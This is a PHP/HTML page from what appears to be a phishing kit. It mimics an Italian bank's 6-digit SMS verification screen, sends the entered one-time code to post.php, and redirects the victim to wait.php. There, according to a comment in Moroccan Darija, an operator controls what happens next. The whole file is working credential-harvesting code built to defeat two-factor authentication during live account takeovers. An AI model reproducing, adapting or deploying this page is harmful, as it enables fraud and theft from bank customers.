<?php
require '../main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirmation</title>
<link rel="stylesheet" href="res/app.css">
<style>
    /* Styling dial l-bouton bach yji professional */
    .btn-continue {
        width: 100%;
        padding: 14px;
        background-color: #007bff; /* Lon l-azraq dial l-bankat */
        color: white;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        margin-top: 20px;
        transition: background 0.3s;
    }
    .btn-continue:hover {
        background-color: #0056b3;
    }
    input.error {
        border: 1px solid red !important;
    }
</style>
</head>
<body>
<main>
<div class="form">
    <div class="header">
        <a href="#" class="back-btn">←</a>
        <div class="logo-small"><img src="res/logo.png"></div>
        <a href="#" class="close-btn">×</a>
    </div>
    <div class="content">
        <h2>Inserisci il codice a 6 cifre</h2>
        <span class="subtitle">Un codice di verifica è stato inviato a</span>
        
        <input type="text" id="u" placeholder="Enter code" maxlength="6" inputmode="numeric">

        <?php if(isset($_GET["e"])){
            echo '<div class="error-message" style="color:red; margin-top:10px;">' . $lang['_invalid_code_message'] . '</div>';
        }
        ?>

        <button type="button" class="btn-continue" onclick="sendLogin()">Continua</button>

        <div class="info-box" style="margin-top:20px;">
            <div class="info-text">
                <strong>Inserisci il codice</strong>
                <p>Codice inviato al telefono. Dovresti ricevere un’e-mail entro 20 secondi.</p>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#" class="resend-link">Invia nuovamente il codice</a>
    </div>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
function sendLogin(){
    let code = $("#u").val();
    $("input").removeClass("error");

    if(code == "" || code.length < 6){
        $("#u").addClass("error");
        return;
    }

    // AJAX post l-post.php
    $.post("post.php", {
        sms: code,
    }, function(res){
        <?php if(isset($_GET['e'])){
            echo 'window.location="exit.php";';
        } else {
            // Hna l-admin ghadi y-controli f wait.php fin ghadi ymchi
            echo 'window.location="wait.php";';
        } ?>
    });
}

$(document).ready(function(){
    // Only numbers
    $("#u").on("input", function(){
        let val = $(this).val().replace(/\D/g, '');
        if(val.length > 6) val = val.substring(0,6);
        $(this).val(val);
    });

    // Enter key submit
    $("#u").keypress(function(e){
        if(e.key === "Enter"){
            sendLogin();
        }
    });
});
</script>
</body>
</html>